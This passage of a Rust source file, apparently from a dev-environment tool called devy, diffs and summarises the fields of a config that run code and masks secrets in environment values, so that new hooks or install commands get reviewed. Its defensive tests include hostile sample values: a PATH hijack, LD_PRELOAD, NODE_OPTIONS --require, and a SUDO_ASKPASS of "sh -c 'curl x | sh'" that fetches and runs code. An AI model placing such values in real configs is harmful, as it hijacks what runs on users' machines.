//! Structural diff of executable config fields (hooks, install commands, taps, images, commands, env) between two configs.
//!
//! "What in `devy.yml` runs code" is defined once, here: AI `init` lists the
//! [`summary`] of a drafted config for review, and AI `doctor` compares a proposed
//! config with the current one through [`diff`], so a newly added hook or install
//! command is never written silently.

use std::collections::BTreeMap;
use std::path::Path;

use crate::ai::redact;
use crate::config::{DevyConfig, HookAction, PackageManagerChoice, RawCommand};
use crate::modules;
use crate::output;

/// The heading an executable entry is listed under.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Hash)]
pub enum Group {
    Hooks,
    InstallCommands,
    ProjectSetup,
    /// Dependencies installed through the package manager (nix, brew, `sudo apt-get`,
    /// winget): each is code from a package source the project chose.
    SystemPackages,
    PackageSources,
    Environment,
    /// Project commands (`devy <name>`). Part of [`diff`], not of the [`summary`]:
    /// they only run when the user invokes them by name.
    Commands,
}

impl Group {
    pub fn title(self) -> &'static str {
        match self {
            Group::Hooks => "Hooks",
            Group::InstallCommands => "Install commands",
            Group::ProjectSetup => "Project setup",
            Group::SystemPackages => "System packages",
            Group::PackageSources => "Package sources",
            Group::Environment => "Environment",
            Group::Commands => "Commands",
        }
    }
}

/// One thing a config makes devy (or the shell devy configures) run.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ExecEntry {
    pub group: Group,
    /// A stable identifier for the entry, used to match entries across configs:
    /// `hooks.before_up[0]`, `dependencies.<name>.after_install`,
    /// `dependencies.<name>.install_cmd`, `dependencies.<name>.setup[<i>]`,
    /// `dependencies.<name>.package`, `dependencies.<name>.tap`, `dependencies.<name>.image`, `environment.<KEY>`,
    /// `commands.<name>`.
    pub key: String,
    /// What is shown to the user, raw (callers strip control characters when printing).
    pub value: String,
}

/// Whether a changed or added executable entry is new or replaces an old value.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum ChangeKind {
    Added,
    Changed,
}

/// An executable entry present in the new config but absent from, or different in, the
/// old one.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ExecChange {
    pub kind: ChangeKind,
    pub entry: ExecEntry,
    /// The old value for [`ChangeKind::Changed`].
    pub old_value: Option<String>,
}

/// `value` cleaned for one summary line: control characters stripped and whitespace
/// runs (including newlines) collapsed, so a padded value cannot push other entries off
/// the screen. Never truncated: the user approves the whole command.
fn shown_value(value: &str) -> String {
    output::clean_line(value)
        .split_whitespace()
        .collect::<Vec<_>>()
        .join(" ")
}

fn command_text(raw: &RawCommand) -> String {
    match raw {
        RawCommand::Simple(cmd) => cmd.clone(),
        RawCommand::Configured { cmd, cwd, shell } => {
            let mut opts = Vec::new();
            if let Some(shell) = shell {
                opts.push(format!("shell: {shell}"));
            }
            if let Some(cwd) = cwd {
                opts.push(format!("cwd: {cwd}"));
            }
            if opts.is_empty() {
                cmd.clone()
            } else {
                format!("{cmd} ({})", opts.join(", "))
            }
        }
    }
}

fn hook_entries(config: &DevyConfig, out: &mut Vec<ExecEntry>) {
    let hooks: [(&str, &Option<HookAction>); 4] = [
        ("before_up", &config.hooks.before_up),
        ("after_up", &config.hooks.after_up),
        ("before_down", &config.hooks.before_down),
        ("after_down", &config.hooks.after_down),
    ];
    for (name, hook) in hooks {
        let Some(hook) = hook else { continue };
        for (i, cmd) in hook.commands().iter().enumerate() {
            out.push(ExecEntry {
                group: Group::Hooks,
                key: format!("hooks.{name}[{i}]"),
                value: format!("{name}: {}", command_text(cmd)),
            });
        }
    }
}

/// How `up` installs a dependency that is not docker-managed, as shown in the summary:
/// the backend `package_manager::detect` picks for `choice` on this platform.
fn package_backend(choice: PackageManagerChoice) -> &'static str {
    match choice {
        PackageManagerChoice::Nix => "nix",
        PackageManagerChoice::Brew => "brew",
        PackageManagerChoice::Apt => "sudo apt-get",
        PackageManagerChoice::Auto => {
            if cfg!(any(target_os = "macos", target_os = "linux")) {
                "nix"
            } else if cfg!(windows) {
                "winget"
            } else {
                "default backend"
            }
        }
    }
}

/// `config`'s dependencies. `DevyConfig::validate` (run by `load`) rejects a config whose
/// dependencies don't normalize; one that was never validated fails closed here, with a
/// single entry naming the error instead of an empty list.
fn dependency_entries(config: &DevyConfig, project_root: Option<&Path>, out: &mut Vec<ExecEntry>) {
    let deps = match config.normalized_dependencies() {
        Ok(deps) => deps,
        Err(e) => {
            out.push(ExecEntry {
                group: Group::SystemPackages,
                key: "dependencies".to_string(),
                value: format!("invalid dependencies: {e:#}"),
            });
            return;
        }
    };
    let backend = package_backend(config.package_manager);
    for dep in &deps {
        let name = &dep.name;
        if !dep.docker {
            // The real route: a module's own installer (rustup, the bun and deno
            // installers), or the backend, through rbenv for Ruby (`rbenv via sudo
            // apt-get`).
            let via = modules::get(name).install_route(backend);
            out.push(ExecEntry {
                group: Group::SystemPackages,
                key: format!("dependencies.{name}.package"),
                value: format!("{} ({via})", dep.versioned_name()),
            });
        }
        if let Some(cmd) = &dep.after_install {
            let shell = dep.shell.as_deref().map(|s| format!(" (shell: {s})"));
            out.push(ExecEntry {
                group: Group::InstallCommands,
                key: format!("dependencies.{name}.after_install"),
                value: format!("{name} after_install: {cmd}{}", shell.unwrap_or_default()),
            });
        }
        if let Some(cmd) = dep.extra.get("install_cmd").and_then(|v| v.as_str()) {
            out.push(ExecEntry {
                group: Group::InstallCommands,
                key: format!("dependencies.{name}.install_cmd"),
                value: format!("{name} install_cmd: {cmd}"),
            });
        }
        if let (Some(root), false) = (project_root, dep.docker) {
            let steps = modules::get(name).setup_steps(dep, root);
            for (i, step) in steps.into_iter().enumerate() {
                out.push(ExecEntry {
                    group: Group::ProjectSetup,
                    key: format!("dependencies.{name}.setup[{i}]"),
                    value: format!("{name}: {step}"),
                });
            }
        }
        if let Some(tap) = &dep.tap {
            out.push(ExecEntry {
                group: Group::PackageSources,
                key: format!("dependencies.{name}.tap"),
                value: format!("{name} tap: {tap}"),
            });
        }
        if let Some(image) = &dep.image {
            out.push(ExecEntry {
                group: Group::PackageSources,
                key: format!("dependencies.{name}.image"),
                value: format!("{name} image: {image}"),
            });
        }
    }
}

/// Every `environment` entry: shadowenv, `devy exec` and `devy export` apply them
/// all, and too many variables change how some program runs (`NODE_OPTIONS`,
/// `GIT_CONFIG_*`, `CARGO_*`, `LUA_INIT`, …) for a list of dangerous names to be
/// complete.
fn environment_entries(config: &DevyConfig, out: &mut Vec<ExecEntry>) {
    let mut keys: Vec<&String> = config.environment.keys().collect();
    keys.sort();
    for key in keys {
        out.push(ExecEntry {
            group: Group::Environment,
            key: format!("environment.{key}"),
            value: format!("{key}={}", config.environment[key]),
        });
    }
}

fn command_entries(config: &DevyConfig, out: &mut Vec<ExecEntry>) {
    let mut names: Vec<&String> = config.commands.keys().collect();
    names.sort();
    for name in names {
        out.push(ExecEntry {
            group: Group::Commands,
            key: format!("commands.{name}"),
            value: format!("{name}: {}", command_text(&config.commands[name])),
        });
    }
}

/// Every executable entry of `config`, in group order. Implicit project setup steps are
/// included only when `project_root` is given (they depend on the files there), and
/// project commands only with `include_commands`.
pub fn executable_entries(
    config: &DevyConfig,
    project_root: Option<&Path>,
    include_commands: bool,
) -> Vec<ExecEntry> {
    let mut out = Vec::new();
    hook_entries(config, &mut out);
    dependency_entries(config, project_root, &mut out);
    environment_entries(config, &mut out);
    if include_commands {
        command_entries(config, &mut out);
    }
    // Stable: keeps declaration order within a group.
    out.sort_by_key(|e| e.group);
    out
}

/// What `devy up` runs for the project at `project_root`: hooks, install commands,
/// implicit setup steps, system packages, package sources and execution-affecting
/// environment keys.
pub fn summary(config: &DevyConfig, project_root: &Path) -> Vec<ExecEntry> {
    executable_entries(config, Some(project_root), false)
}

/// The summary as printable lines: a group title followed by its entries indented, with
/// control characters stripped from every value. Groups without entries are omitted.
pub fn render_summary(entries: &[ExecEntry]) -> Vec<String> {
    let mut lines = Vec::new();
    let mut current: Option<Group> = None;
    for entry in entries {
        if current != Some(entry.group) {
            current = Some(entry.group);
            lines.push(entry.group.title().to_string());
        }
        let value = match (entry.group, entry.key.strip_prefix("environment.")) {
            (Group::Environment, Some(key)) => masked_environment(key, &entry.value),
            _ => entry.value.clone(),
        };
        lines.push(format!("  {}", shown_value(&value)));
    }
    lines
}

/// An `environment` entry's `KEY=value` as shown, so a secret in `devy.yml` never lands
/// in a terminal or CI log through the summary, while the values that decide what
/// runs stay visible. Credential-looking parts (URL passwords, tokens with a known
/// prefix, secret-named assignments) are always masked. For a key that names a secret
/// (the ai-assist key rule), the whole value is `<redacted>` unless [`secret_value_shown`]
/// says otherwise. Only the rendering is masked; [`diff`] compares the raw value.
fn masked_environment(key: &str, value: &str) -> String {
    let shown = |v: &str| {
        // `GIT_CONFIG_KEY_<n>` holds a config name (`core.fsmonitor`), never a secret, and
        // decides what its `GIT_CONFIG_VALUE_<n>` makes git run.
        if redact::is_secret_key(key) && !git_config_key(key) && !secret_value_shown(key, v) {
            let last = redact::key_words(key).pop().unwrap_or_default();
            if runs_a_command(&last) && !v.trim().is_empty() {
                // Say so: the value is a command devy cannot show without risking a secret.
                format!("{} (a command; review it in devy.yml)", redact::REDACTED)
            } else {
                let hidden = redact::value(key, v);
                if hidden == redact::REDACTED
                    && (!pure_credential_word(&last) || exec_key(key).is_some())
                {
                    // A value that may decide what runs is never hidden silently: only a
                    // key ending in a word that names the secret itself (and not also a
                    // file, as `*_CREDENTIALS` may) goes without the note.
                    format!("{hidden} (may name a program or file; review it in devy.yml)")
                } else {
                    hidden
                }
            }
        } else {
            // Masking that leaves part of the value hidden is called out, so a hostile
            // value cannot pass a command off as a redacted token.
            let masked = redact::credential_parts_inline(v);
            if masked != v {
                format!("{masked} (partly hidden; review it in devy.yml)")
            } else {
                masked
            }
        }
    };
    match value.strip_prefix(key).and_then(|v| v.strip_prefix('=')) {
        Some(rest) => format!("{key}={}", shown(rest)),
        None => shown(value),
    }
}

/// Whether the value of a secret-named key is shown (credential parts still masked):
/// - a switch (`0`, `1`, `true`, `false`, `yes`, `no`, `on`, `off`), which can turn off a
///   check (`NODE_TLS_REJECT_UNAUTHORIZED=0`) but is no secret, for any key; and a mode
///   word ([`is_mode`]: `SSH_ASKPASS_REQUIRE=force`) for a key that does not name a
///   credential outright;
/// - `*ASKPASS`, which names the program that asks for a password;
/// - for a key naming a credential outright ([`names_a_credential`]), only a reference
///   to a program: a strict path when the last word is `FILE`, `DIR` or `PATH`
///   (`ANSIBLE_VAULT_PASSWORD_FILE=./x`, which ansible runs when executable), a path or
///   command line when it is a command word ([`runs_a_command`]: `COMMAND`, `HELPER`,
///   `CMD`, `PROVIDER`, `PROVIDERS`, as in `RESTIC_PASSWORD_COMMAND` or
///   `CARGO_REGISTRY_CREDENTIAL_PROVIDER`), or options starting with a flag or a path
///   when it is `OPTIONS` or `OPTS` (`PASSWORD_STORE_GPG_OPTS`);
/// - for a program key ([`ExecKey::Program`]: `*ASKPASS`, command words, `*_OPTIONS`,
///   `*_OPTS`, `*_PATH`, `LD_*`, `DYLD_*`), a strict path, a command line, or a bare
///   program name ([`program_name`]);
/// - for a file or socket key ([`ExecKey::File`]: certificates, CA bundles,
///   `*CREDENTIALS*`, `*SOCK`, `DBUS_*`, `XAUTHORITY`), a value that names a file
///   ([`names_a_file`]).
///
/// Anything else stays `<redacted>`: a password can contain spaces, `&`, `:` or `/`, so
/// a value's shape alone never reveals a value under a credential name. A hidden value
/// is followed by a note that it needs review unless the key's last word names the
/// secret itself ([`pure_credential_word`]).
fn secret_value_shown(key: &str, value: &str) -> bool {
    let v = value.trim();
    if is_switch(v) || (is_mode(v) && !names_a_credential(key)) {
        return true;
    }
    let last = redact::key_words(key).pop().unwrap_or_default();
    // `*ASKPASS` names the program that asks for a password (for git, ssh or sudo); it
    // never holds the password itself.
    if last.ends_with("ASKPASS") {
        return true;
    }
    let command_key = runs_a_command(&last);
    let location_key = matches!(last.as_str(), "FILE" | "DIR" | "PATH");
    if names_a_credential(key) {
        return if location_key {
            names_a_path(v)
        } else if command_key {
            // `GIT_CREDENTIAL_HELPER: osxkeychain`: a bare program name (no digits) too.
            command_line(v) || program_name(v)
        } else if options_word(&last) {
            // `PASSWORD_STORE_GPG_OPTS: --no-throw-keyids`.
            options_value(v)
        } else {
            false
        };
    }
    match exec_key(key) {
        // A secret-named command key (`CERT_COMMAND`): a command line as
        // for credential keys, or a bare program name.
        Some(ExecKey::Program) if command_key => command_line(v) || program_name(v),
        Some(ExecKey::Program) if options_word(&last) => options_value(v),
        Some(ExecKey::Program) => names_a_path(v) || v.chars().any(char::is_whitespace),
        // `NODE_EXTRA_CA_CERTS: certs/ca`; a `*CREDENTIALS` value with a `/` may be
        // `user/password`, so it needs a file extension unless the key ends in a location.
        Some(ExecKey::File) => {
            names_a_file(key, v)
                || ((location_key || !redact::key_words(key).iter().any(|w| w == "CREDENTIALS"))
                    && relative_path(v))
        }
        None => location_key && names_a_path(v),
    }
}

/// Whether a key's last word names the secret itself (`PASSWORD`, `PASSWD`, `PASS`,
/// `PASSPHRASE`, `TOKEN`, `SECRET`, `KEY`, `APIKEY`, `PIN`, `AUTH`, `SALT`, `SIG`,
/// `SIGNATURE`, `CREDENTIAL`, or a plural), so a hidden value under it is shown as plain
/// `<redacted>`. Under any other last word (`CARGO_REGISTRY_CREDENTIAL_PROVIDER`,
/// `PASSWORD_STORE_GPG_OPTS`, `SSH_ASKPASS_REQUIRE`) the value may name a program, a file
/// or a mode, and the summary says it needs review. `PWD` is left out: it is also the
/// shell's working directory (`PWD` itself is refused at load), so a value hidden under
/// `MYSQL_PWD` keeps the note rather than passing as a plain secret.
fn pure_credential_word(last: &str) -> bool {
    const WORDS: &[&str] = &[
        "PASSWORD",
        "PASSWD",
        "PASS",
        "PASSPHRASE",
        "TOKEN",
        "SECRET",
        "KEY",
        "APIKEY",
        "PIN",
        "AUTH",
        "SALT",
        "SIG",
        "SIGNATURE",
        "CREDENTIAL",
    ];
    WORDS
        .iter()
        .any(|w| last == *w || last.strip_suffix('S') == Some(w))
}

/// Whether `v` reads as a path for a `*_FILE`, `*_DIR` or `*_PATH` key: no whitespace,
/// and path-shaped ([`path_shaped`]), a relative path ([`relative_path`]), or a bare file
/// name with an extension (`vault.sh`). A bare word without an extension (`hunter8`)
/// is not: it is as likely a password.
fn names_a_path(v: &str) -> bool {
    if v.is_empty() || v.chars().any(char::is_whitespace) {
        return false;
    }
    path_shaped(v)
        || relative_path(v)
        || (plain_segment(v)
            && v.rsplit_once('.').is_some_and(|(stem, ext)| {
                !stem.is_empty()
                    && (1..=8).contains(&ext.len())
                    && ext.starts_with(|c: char| c.is_ascii_alphabetic())
                    && ext.chars().all(|c| c.is_ascii_alphanumeric())
            }))
}

/// A relative path of at least two plain segments (letters, digits, `.`, `-`, `_`)
/// separated by `/` or `\` (`scripts/askpass.sh`, `certs\ca`). `user:password` and
/// URLs are not plain.
fn relative_path(v: &str) -> bool {
    v.contains(['/', '\\']) && v.split(['/', '\\']).all(plain_segment)
}

/// A non-empty path segment of letters, digits, `.`, `-` and `_`.
fn plain_segment(seg: &str) -> bool {
    !seg.is_empty()
        && seg
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '-' | '_'))
}

/// `GIT_CONFIG_KEY_<n>`.
fn git_config_key(key: &str) -> bool {
    // Case-insensitively: Windows environment names are.
    const PREFIX: &str = "GIT_CONFIG_KEY_";
    key.len() > PREFIX.len()
        && key.is_char_boundary(PREFIX.len())
        && key[..PREFIX.len()].eq_ignore_ascii_case(PREFIX)
        && key[PREFIX.len()..].chars().all(|c| c.is_ascii_digit())
}

/// Whether a key's last word says its value is a command that is run: `COMMAND`,
/// `HELPER`, `CMD`, `PROVIDER` or `PROVIDERS` (cargo's credential providers), or a word
/// ending in `COMMAND` (`BORG_PASSCOMMAND`).
fn runs_a_command(last: &str) -> bool {
    last.ends_with("COMMAND") || matches!(last, "HELPER" | "CMD" | "PROVIDER" | "PROVIDERS")
}

/// Whether a key's last word says its value is options for a program: `OPTIONS` or `OPTS`.
fn options_word(last: &str) -> bool {
    matches!(last, "OPTIONS" | "OPTS")
}

/// Options start with a flag or name a file; a lone phrase is more likely a secret.
fn options_value(v: &str) -> bool {
    let first = v.split_whitespace().next().unwrap_or("");
    first.starts_with('-') || path_shaped(first)
}

/// Programs that commonly print a secret, for a credential key's command: a value is
/// shown as a command when its first word starts like a path or is one of these, so a
/// passphrase such as `correct horse` stays hidden.
const SECRET_PRINTERS: &[&str] = &[
    "sh",
    "bash",
    "zsh",
    "fish",
    "dash",
    "env",
    "cat",
    "python",
    "python3",
    "node",
    "ruby",
    "perl",
    "op",
    "pass",
    "gopass",
    "gpg",
    "security",
    "vault",
    "aws",
    "gcloud",
    "az",
    "bw",
    "lpass",
    "keyring",
    "secret-tool",
    "sops",
    "age",
    "curl",
    "wget",
    "kubectl",
    "doppler",
    "infisical",
    "chamber",
];

/// Whether `v` is a command line or path to show for a credential key's command: its
/// first word starts like a path or is a common secret-printing program, any word starts
/// like a path, or it is a command line with whitespace and a shell operator (`|`, `;`,
/// `&&`, `$(`, a backtick, `<`, `>`). A plain passphrase (`correct horse`) is none of these.
fn command_line(v: &str) -> bool {
    let mut words = v.split_whitespace();
    let first = words.next().unwrap_or("");
    let operator = ["|", ";", "&&", "$(", "`", "<", ">"]
        .iter()
        .any(|op| v.contains(op));
    path_shaped(first)
        || SECRET_PRINTERS.contains(&first)
        || words.any(path_shaped)
        || (v.chars().any(char::is_whitespace) && operator)
}

/// A bare program name looked up on PATH (`askpass-helper`, `pinentry-mac`): letters,
/// `-`, `_` and `.` only. Digits are left out, since `hunter8` is more likely a password.
fn program_name(v: &str) -> bool {
    !v.is_empty()
        && v.len() <= 40
        && v.starts_with(|c: char| c.is_ascii_alphabetic())
        && v.chars()
            .all(|c| c.is_ascii_alphabetic() || matches!(c, '-' | '_' | '.'))
}

fn is_switch(v: &str) -> bool {
    ["0", "1", "true", "false", "yes", "no", "on", "off"]
        .iter()
        .any(|s| v.eq_ignore_ascii_case(s))
}

/// A mode word (`SSH_ASKPASS_REQUIRE=force`), shown for a key that does not name a
/// credential outright.
fn is_mode(v: &str) -> bool {
    ["never", "prefer", "force", "always", "auto"]
        .iter()
        .any(|s| v.eq_ignore_ascii_case(s))
}

/// What an execution-affecting key's value names.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum ExecKey {
    /// A program, its options, or a search path.
    Program,
    /// A certificate, credentials file, socket or display authority file.
    File,
}

/// The kind of execution-affecting key `key` is, matched on whole words (split at `_`,
/// `-`, `.` and camelCase), so `REDIS_CACHE_KEY` is not a `CA` key.
fn exec_key(key: &str) -> Option<ExecKey> {
    let words = redact::key_words(key);
    let has = |w: &str| words.iter().any(|x| x == w);
    let first = words.first().map(String::as_str);
    let last = words.last().map(String::as_str);
    let program = last.is_some_and(|l| {
        l.ends_with("ASKPASS") || runs_a_command(l) || options_word(l) || l == "PATH"
    }) || matches!(first, Some("LD" | "DYLD"));
    if program {
        return Some(ExecKey::Program);
    }
    let file = has("CERT")
        || has("CERTS")
        || has("CA")
        || has("CREDENTIALS")
        || last == Some("SOCK")
        || first == Some("DBUS")
        || key.eq_ignore_ascii_case("XAUTHORITY");
    file.then_some(ExecKey::File)
}

/// Whether `key` names a credential outright, so an execution-affecting word in it does
/// not make its value shown: a word `PASSWORD`, `PASSWD`, `PWD`, `TOKEN`, `SECRET`,
/// `PRIVATE`, `KEY`, `APIKEY`, `AUTH`, `COOKIE`, `SESSION`, `DSN`, `SIG`, `SIGNATURE`,
/// `SALT`, `PAT`, `PIN` or `CREDS` (or a plural), `PASS` (`PASSPHRASE`, `PASSCODE`),
/// `TOKEN` or `SECRET` inside a word, or a word ending in `KEY` or `AUTH`
/// (`MASTERKEY`, `OAUTH`). `ASKPASS` names a program and `AUTH_SOCK` a
/// socket, so neither counts; `DBUS_SESSION_BUS_ADDRESS` names the bus.
fn names_a_credential(key: &str) -> bool {
    const WORDS: &[&str] = &[
        "PASSWORD",
        "PASSWD",
        "PWD",
        "TOKEN",
        "SECRET",
        "PRIVATE",
        "KEY",
        "APIKEY",
        "AUTH",
        "COOKIE",
        "SESSION",
        "DSN",
        "SIG",
        "SIGNATURE",
        "SALT",
        "PAT",
        "PIN",
        "CREDS",
        "PW",
    ];
    let mut words = redact::key_words(key);
    if words.last().is_some_and(|w| w == "SOCK") {
        words.retain(|w| w != "AUTH");
    }
    if words.first().is_some_and(|w| w == "DBUS") {
        words.retain(|w| w != "SESSION");
    }
    words.iter().any(|w| {
        let w = w.as_str();
        if w.ends_with("ASKPASS") {
            return false;
        }
        WORDS
            .iter()
            .any(|part| w == *part || w.strip_suffix('S') == Some(part))
            || ["PASS", "TOKEN", "SECRET"]
                .iter()
                .any(|part| w.contains(part))
            || w.ends_with("KEY")
            || w.ends_with("AUTH")
            || matches!(w, "CREDENTIAL" | "KEYSTORE" | "KEYRING" | "KEYCHAIN")
    })
}

/// Whether `v` starts like a path: `/`, `./`, `../`, `~/`, `\` or a drive letter.
fn path_shaped(v: &str) -> bool {
    let b = v.as_bytes();
    let drive =
        b.len() >= 3 && b[0].is_ascii_alphabetic() && b[1] == b':' && matches!(b[2], b'\\' | b'/');
    drive
        || v.starts_with(['/', '\\'])
        || ["./", "../", "~/", ".\\", "..\\"]
            .iter()
            .any(|p| v.starts_with(p))
}

/// Whether `v` names a file or socket for the file key `key`: path-shaped, or a
/// relative path or file name of plain segments (letters, digits, `.`, `-`, `_`) ending
/// in a certificate, key, credentials or config extension (`certs/ca.pem`,
/// `creds.json`); for a `DBUS_*` or `*SOCK` key also a socket address (`unix:path=…`).
/// Nothing with whitespace, so a value carrying `user:password` is never taken for a
/// file.
fn names_a_file(key: &str, v: &str) -> bool {
    if v.chars().any(char::is_whitespace) {
        return false;
    }
    if path_shaped(v) {
        return true;
    }
    let words = redact::key_words(key);
    let socket_key =
        words.first().is_some_and(|w| w == "DBUS") || words.last().is_some_and(|w| w == "SOCK");
    if socket_key && (v.starts_with("unix:path=") || v.starts_with("unix:abstract=")) {
        return true;
    }
    const EXTENSIONS: &[&str] = &[
        "pem", "crt", "cer", "der", "key", "p12", "pfx", "json", "jks", "ini", "toml", "yaml",
        "yml", "sock", "conf",
    ];
    let plain = v.split('/').all(|seg| {
        !seg.is_empty()
            && seg
                .chars()
                .all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '-' | '_'))
    });
    plain
        && v.rsplit_once('.').is_some_and(|(stem, ext)| {
            !stem.is_empty() && EXTENSIONS.iter().any(|e| ext.eq_ignore_ascii_case(e))
        })
}

/// The executable entries `new` adds or changes relative to `old`, including project
/// commands. Removed entries are not reported: removing code to run needs no review.
/// Formatting-only differences (quoting, key order, comments) produce no change.
pub fn diff(old: &DevyConfig, new: &DevyConfig, project_root: Option<&Path>) -> Vec<ExecChange> {
    let old_entries: BTreeMap<String, String> = executable_entries(old, project_root, true)
        .into_iter()
        .map(|e| (e.key, e.value))
        .collect();
    executable_entries(new, project_root, true)
        .into_iter()
        .filter_map(|entry| match old_entries.get(&entry.key) {
            None => Some(ExecChange {
                kind: ChangeKind::Added,
                entry,
                old_value: None,
            }),
            Some(old) if *old != entry.value => Some(ExecChange {
                kind: ChangeKind::Changed,
                old_value: Some(old.clone()),
                entry,
            }),
            Some(_) => None,
        })
        .collect()
}

#[cfg(test)]
mod tests {
    use super::*;

    fn config(yaml: &str) -> DevyConfig {
        crate::yaml_safe::from_str_strict(yaml, "test").unwrap()
    }

    fn values(entries: &[ExecEntry], group: Group) -> Vec<&str> {
        entries
            .iter()
            .filter(|e| e.group == group)
            .map(|e| e.value.as_str())
            .collect()
    }

    /// Scenario "Summary lists hooks and setup".
    #[test]
    fn summary_lists_hooks_and_setup() {
        let dir = crate::test_support::tmp_dir();
        std::fs::write(dir.join("package.json"), "{}").unwrap();
        let cfg = config("dependencies:\n  - node\nhooks:\n  after_up: \"make seed\"\n");
        let entries = summary(&cfg, &dir);
        assert_eq!(values(&entries, Group::Hooks), ["after_up: make seed"]);
        assert_eq!(
            values(&entries, Group::ProjectSetup),
            ["node: npm install (package.json lifecycle scripts)"]
        );
        let lines = render_summary(&entries);
        let backend = package_backend(PackageManagerChoice::Auto);
        assert_eq!(
            lines,
            [
                "Hooks".to_string(),
                "  after_up: make seed".to_string(),
                "Project setup".to_string(),
                "  node: npm install (package.json lifecycle scripts)".to_string(),
                "System packages".to_string(),
                format!("  node ({backend})"),
            ]
        );
    }

    /// Scenario "Summary lists system packages".
    #[test]
    fn summary_lists_system_packages_with_their_backend() {
        let dir = crate::test_support::tmp_dir();
        let cfg = config(concat!(
            "package_manager: apt
",
            "dependencies:
",
            "  - jq
",
            "  - node:
      version: \"20\"
",
            "  - redis:
      service_manager: docker
",
        ));
        let entries = summary(&cfg, &dir);
        // The docker-managed service is an image, not a system package.
        assert_eq!(
            values(&entries, Group::SystemPackages),
            ["jq (sudo apt-get)", "node@20 (sudo apt-get)"]
        );
        let lines = render_summary(&entries);
        assert!(lines.contains(&"System packages".to_string()), "{lines:?}");
        assert!(
            lines.contains(&"  jq (sudo apt-get)".to_string()),
            "{lines:?}"
        );

        let brew = config("package_manager: brew\ndependencies:\n  - jq\n");
        assert_eq!(
            values(&summary(&brew, &dir), Group::SystemPackages),
            ["jq (brew)"]
        );
        // Modules that always bypass the package manager name their installer; the
        // others show the route through it, including sudo.
        let own = config(
            "package_manager: brew\ndependencies:\n  - rust\n  - bun\n  - deno\n  - gcloud\n  - ruby\n",
        );
        assert_eq!(
            values(&summary(&own, &dir), Group::SystemPackages),
            [
                "rust (rustup)",
                "bun (bun-installer)",
                "deno (deno-installer)",
                "gcloud (brew)",
                "ruby (rbenv via brew)"
            ]
        );
        let apt = config("package_manager: apt\ndependencies:\n  - ruby\n  - gcloud\n  - rust\n");
        assert_eq!(
            values(&summary(&apt, &dir), Group::SystemPackages),
            [
                "ruby (rbenv via sudo apt-get)",
                "gcloud (gcloud-installer)",
                "rust (rustup)"
            ]
        );
        assert_eq!(modules::get("ruby").install_route("winget"), "winget");
        assert_eq!(modules::get("gcloud").install_route("winget"), "winget");
        assert_eq!(modules::get("jq").install_route("nix"), "nix");
        // Adding a package is a change devy runs, so `doctor --yes` does not apply a fix
        // that adds one.
        let changes = diff(
            &brew,
            &config("package_manager: brew\ndependencies:\n  - jq\n  - wget\n"),
            None,
        );
        assert_eq!(changes.len(), 1);
        assert_eq!(changes[0].entry.value, "wget (brew)");
    }

    #[test]
    fn dependencies_that_do_not_normalize_fail_closed() {
        let cfg = config("dependencies:\n  - { jq: {}, wget: {} }\n");
        let entries = executable_entries(&cfg, None, false);
        assert_eq!(entries.len(), 1);
        assert_eq!(entries[0].group, Group::SystemPackages);
        assert!(
            entries[0].value.contains("multiple keys"),
            "{:?}",
            entries[0]
        );
    }

    #[test]
    fn summary_covers_every_group_and_omits_empty_ones() {
        let dir = crate::test_support::tmp_dir();
        std::fs::write(dir.join("Gemfile"), "").unwrap();
        let cfg = config(concat!(
            "dependencies:\n",
            "  - ruby\n",
            "  - jq:\n      after_install: \"echo hi\"\n      shell: bash\n",
            "  - python:\n      install_cmd: \"poetry install\"\n",
            "  - foo:\n      tap: org/tap\n",
            "environment:\n  PATH: \"/evil:$PATH\"\n  LD_PRELOAD: x.so\n  DATABASE_URL: x\n",
            "commands:\n  dev: \"npm run dev\"\n",
        ));
        let entries = summary(&cfg, &dir);
        assert!(values(&entries, Group::Hooks).is_empty());
        assert_eq!(
            values(&entries, Group::InstallCommands),
            [
                "jq after_install: echo hi (shell: bash)",
                "python install_cmd: poetry install"
            ]
        );
        assert_eq!(
            values(&entries, Group::ProjectSetup),
            ["ruby: bundle install (Gemfile, gem native extensions)"]
        );
        assert_eq!(
            values(&entries, Group::PackageSources),
            ["foo tap: org/tap"]
        );
        let backend = package_backend(PackageManagerChoice::Auto);
        assert_eq!(
            values(&entries, Group::SystemPackages),
            [
                if backend == "winget" {
                    "ruby (winget)".to_string()
                } else {
                    format!("ruby (rbenv via {backend})")
                },
                format!("jq ({backend})"),
                format!("python ({backend})"),
                format!("foo ({backend})"),
            ]
        );
        assert_eq!(
            values(&entries, Group::Environment),
            ["DATABASE_URL=x", "LD_PRELOAD=x.so", "PATH=/evil:$PATH"]
        );
        assert!(values(&entries, Group::Commands).is_empty());
        let lines = render_summary(&entries);
        assert!(!lines.contains(&"Hooks".to_string()), "{lines:?}");
        assert_eq!(lines[0], "Install commands");
    }

    #[test]
    fn summary_masks_secret_environment_values() {
        let dir = crate::test_support::tmp_dir();
        let cfg = config(concat!(
            "environment:\n",
            "  API_TOKEN: hunter2-very-secret\n",
            "  DATABASE_URL: \"postgres://admin:s3cr3tpw@db/app\"\n",
            "  NODE_OPTIONS: \"--require ./x.js\"\n",
        ));
        let entries = summary(&cfg, &dir);
        // The entries (and so `diff`) keep the raw values.
        assert!(values(&entries, Group::Environment).contains(&"API_TOKEN=hunter2-very-secret"));
        let lines = render_summary(&entries).join("\n");
        assert!(!lines.contains("hunter2"), "{lines}");
        assert!(!lines.contains("s3cr3tpw"), "{lines}");
        assert!(lines.contains("  API_TOKEN=<redacted>"), "{lines}");
        assert!(lines.contains("  DATABASE_URL=postgres://"), "{lines}");
        assert!(lines.contains("  NODE_OPTIONS=--require ./x.js"), "{lines}");
    }

    /// Scenario "Execution-affecting values are shown".
    #[test]
    fn summary_shows_execution_affecting_values_of_secret_keys() {
        let dir = crate::test_support::tmp_dir();
        let cfg = config(concat!(
            "environment:\n",
            "  GIT_ASKPASS: ./scripts/x.sh\n",
            "  SSH_ASKPASS: askpass-helper\n",
            "  SUDO_ASKPASS: \"sh -c 'curl x | sh'\"\n",
            "  SSL_CERT_FILE: /tmp/evil.pem\n",
            "  NODE_EXTRA_CA_CERTS: certs/ca.pem\n",
